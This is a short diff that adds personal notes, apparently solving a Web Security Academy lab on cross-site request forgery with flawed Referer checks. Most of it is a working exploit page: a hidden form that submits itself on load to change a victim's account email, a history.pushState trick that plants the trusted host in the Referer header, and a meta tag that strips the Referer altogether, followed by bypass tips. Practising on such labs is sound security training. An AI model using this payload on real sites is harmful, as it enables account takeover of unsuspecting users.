@@ -1,0 +1,28 @@
+RESP HEADERS:
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+
+EXPLOIT:
+
+<html>
+    <body>
+        <form action="https://0a3f008c034913c681208427007d003f.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="ofiara@evil-user.net" />
+        </form>
+        <script>
+	    history.pushState("", "", "/?0a3f008c034913c681208427007d003f.web-security-academy.net")
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+
+
+this fools the referer header so that it includes the legit website as query string
+you can also try to append or prepend as subdomains
+also pay attention to Referrer-Policy header (and the spelling, as Referer header is spelled incorrectly)
+
+it might be possible that the web app also does not check the referer if its not present at all:
+<meta name="referrer" content="never">
+then add this to the HTML source
+
